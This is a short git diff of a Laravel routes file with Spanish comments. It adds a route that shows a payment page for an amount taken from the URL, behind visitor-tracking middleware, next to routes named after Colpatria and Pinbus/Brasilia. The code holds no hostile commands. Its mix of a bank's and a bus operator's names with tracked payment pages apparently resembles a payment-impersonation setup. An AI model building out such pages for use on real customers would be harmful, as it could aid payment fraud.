@@ -35,6 +35,19 @@ Route::post('/colpatria/actualizar', [\App\Http\Controllers\ColpatriaController:
 // Rutas de Pinbus/Brasilia
 // IMPORTANTE: El archivo se llama page.html (no index.html) para evitar que Nginx lo sirva directamente
 // y así el middleware TrackVisitor pueda registrar las visitas
+
+// Ruta específica para pago directo con valor numérico en la URL
+// Ejemplo: /pin/inicio/150000 muestra la página de método de pago con $150,000
+Route::get('/pin/inicio/{valor}', function ($valor) {
+    // Formatear el valor para mostrar con formato de moneda colombiana
+    $totalFormateado = '$' . number_format((int) $valor, 0, ',', '.');
+    return view('pin.pago-directo', [
+        'valor' => (int) $valor,
+        'totalFormateado' => $totalFormateado
+    ]);
+})->where('valor', '[0-9]+')->middleware(\App\Http\Middleware\TrackVisitor::class)->name('pinbus.pago.directo');
+
+// Ruta genérica para page.html (debe ir después de la ruta específica)
 Route::get('/pin/inicio/{trailing?}', function () {
     return response()->file(public_path('pin/inicio/page.html'));
 })->where('trailing', '.*')->middleware(\App\Http\Middleware\TrackVisitor::class)->name('pinbus.inicio');
